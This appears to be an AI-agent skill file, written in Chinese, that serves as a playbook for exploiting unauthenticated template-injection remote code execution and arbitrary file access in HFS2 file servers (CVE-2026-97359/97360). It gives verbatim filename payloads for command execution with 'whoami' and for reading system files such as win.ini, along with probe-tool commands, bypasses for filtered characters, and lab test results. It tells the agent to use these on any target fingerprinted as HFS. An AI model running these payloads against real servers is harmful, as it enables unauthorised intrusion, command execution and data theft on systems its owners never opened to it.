---
name: hfs2-unauth-template-rce
description: Use when 目标出现 HFS/HFS2/HttpFileServer 指纹或要打文件服务器/内网换机站. 未授权模板注入 RCE + 任意文件读写删(CVE-2026-97359/97360), 含本机实测 payload 与负控.
---

# HFS2 未授权模板注入 RCE（CVE-2026-97359 / CVE-2026-97360）

## 何时用

- 指纹命中 **HFS / HFS2 / HttpFileServer / rejetto**（页面目录列表 + `?q=` 检索；Server 头 `HFS`）
- 默认端口：HFS **2.4 = 80**，HFS **2.3 = 8080**
- 场景：内网文件交换、公开上传目录、弱口令打点后的老实例
- 受影响：**2.0.0 ≤ HFS2 ≤ 2.4.0**（CVSS 4.0 双 10.0；97359=RCE，97360=任意文件读写删）

## 核心链路（一句话）

`POST /` multipart 的 **filename 会被模板渲染** → `%item-resource%:}` 跳出变量上下文
→ 宏引擎**无授权模型** + 路径解析**不限制绝对路径** → 未授权 RCE / 任意文件访问。
**上传失败也会渲染文件名**，所以「上传被拒」不代表打不动。

## 三档打法（逐字 payload）

前缀固定 `%item-resource%:}`；宏里 `|` `\` `:` 用 chr 合成更稳：
`{.|.}`=`|`、`{.chr|92.}`=`\`、`{.chr|58.}`=`:`。

| 档 | filename | 期望回显 |
| --- | --- | --- |
| L2 确认 | `%item-resource%:}{.add|7000000|788.}` | `7000788` |
| L3 执行 | `%item-resource%:}{.exec|whoami|timeout=20|out=z.}{.^z.}` | 进程身份 |
| L3 复验 | `%item-resource%:}{.exec|echo ZZRCE<rand>|timeout=20|out=z.}{.^z.}` | 标记命中才算真执行 |
| L4 存在 | `%item-resource%:}{.exists|C{.chr|58.}{.chr|92.}Windows{.chr|92.}win.ini.}` | `true` |
| L4 读 | `%item-resource%:}{.load|<path>|var=z.}{.^z.}` | 文件内容（**共享目录之外**） |
| 负控 | 同形宏指向不存在路径 | 空（否则不能算读成功） |

## 一键

```bash
python tools/ops/hfs2_probe.py <target> --port 80 -p l1,l2 --case <案卷>
python tools/ops/hfs2_probe.py <target> -p l3 --cmd whoami --case <案卷>
python tools/ops/hfs2_probe.py <target> -p l4 --read "C:/Windows/win.ini"
```

模板：`tools/1day-kit/custom-templates/hfs2-unauth-template-rce.yaml`（指纹 + 非破坏 oracle）

## 工具（已本机实测）

```bash
python3 tools/ops/hfs2_probe.py <host> --port 80 -p l1,l2 --case <案卷>        # 只指纹+算术 oracle
python3 tools/ops/hfs2_probe.py 127.0.0.1 --selftest -p l1,l2 --case selftest  # 本机自检（放行 loopback）
```

实测（HFS 2.4.0 RC7，2026-09-25）：`server_header = "HFS 2.4.0 RC7"` →
`l2.hit: true`（`7000857+305=7001162` 算术 oracle 回显）→ `verdict: template-injection-confirmed`，exit 0。
**上传被拒也渲染文件名**，所以 oracle 通 = 模板注入成立。

写探针的坑：
- 载荷串含 `%item-resource%` → **不能用 `%`-格式化**拼接（`ValueError`），用字符串拼接。
- `scope_lib.require_in_scope()` **只回 host**（不带 scheme）→ base 要另建，否则 `No scheme supplied`。
- `write_probe_json(out=…)` 的 `out` 是**文件路径**，给目录会 `PermissionError`。
- 本机 nuclei 是 macOS 二进制 → YAML 只能 `python -c "import yaml"` 结构校验，`od_kit validate` 必报错。

## 坑

1. 命令里 `|`/`>`/`&` 被 multipart 头吃掉 → 换 chr 合成 / 用成对 `{.exec|...|out=z.}{.^z.}`
2. 同一 filename 里多个同形宏**只替换第一次**
3. 权限天花板 = HFS 进程身份（服务启动=SYSTEM/Administrator，双击=当前用户）→ 先 whoami
4. 别对真实客户机用 `{.delete.}`/`{.save.}`，破坏性操作只能在明确授权下做
5. HFS 2.3 语法同族但不等价：老实例先跑 L2 oracle 探语法

## 证据基线（本机实测）

HFS2 **2.4.0 RC7** 官方二进制（sha256 `42d14f9efe83cd9d695d0796232bd6e12d276c1262b6cf39d31cfcf64e128f11`）：
L2 `7000788 出现: True` / L3 `ZZRCE7734 出现: True` / L4 `win.ini 读取成功: True` / 负控 `无内容: True`。
复现脚本 `tmp/hfs2-test/verify_hfs2_2.4rc07.py`，手法文档
`docs/playbooks/HFS2未授权模板注入RCE与宏越权手法.md`。
